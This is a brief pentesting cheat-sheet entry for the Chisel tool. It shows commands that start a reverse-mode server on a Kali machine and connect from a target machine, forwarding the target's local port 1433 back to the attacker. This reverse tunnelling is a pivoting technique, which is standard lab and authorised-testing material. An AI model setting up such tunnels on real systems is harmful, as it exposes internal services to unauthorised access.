### Chisel
```
#at kali machine
chisel server --port 445 --reverse
#at target machine
cmd /c chisel.exe <serverIP:port> R:<kali port to forward to>:127.0.0.1:<local port to forward>
chisel.exe client $KaliIP:445 R:1433:127.0.0.1:1433
```
